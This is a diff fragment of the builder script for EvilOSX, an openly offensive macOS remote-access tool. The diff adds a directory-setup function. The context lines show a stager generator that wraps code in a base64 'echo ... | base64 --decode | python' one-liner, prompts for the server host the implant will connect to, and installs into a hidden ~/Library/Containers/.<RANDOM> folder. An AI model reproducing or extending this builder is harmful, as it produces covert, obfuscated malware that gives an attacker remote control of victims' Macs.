@@ -4,16 +4,17 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
+import json
 import random
 import string
-from os import path
+from base64 import b64encode
+from os import path, mkdir
 from sys import exit
 from textwrap import dedent
 from uuid import uuid4
-from base64 import b64encode
-import json
 
 from bot import launchers, loaders
+from server.modules.helper import DATA_DIRECTORY
 
 MESSAGE_INPUT = "[\033[1m?\033[0m] "
 MESSAGE_INFO = "[\033[94mI\033[0m] "
@@ -95,7 +96,22 @@ def create_stager(server_host: str, server_port: int, loader_options: dict) -> s
     return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())
 
 
+def setup():
+    """Creates the required directories used by the server."""
+    directories = [
+        DATA_DIRECTORY,
+        path.join(DATA_DIRECTORY, "builds"),
+        path.join(DATA_DIRECTORY, "output")
+    ]
+
+    for directory in directories:
+        if not path.exists(directory):
+            mkdir(directory)
+
+
 def main():
+    setup()
+
     server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ")
     server_port = int(input(MESSAGE_INPUT + "Server port: "))
     program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: ")
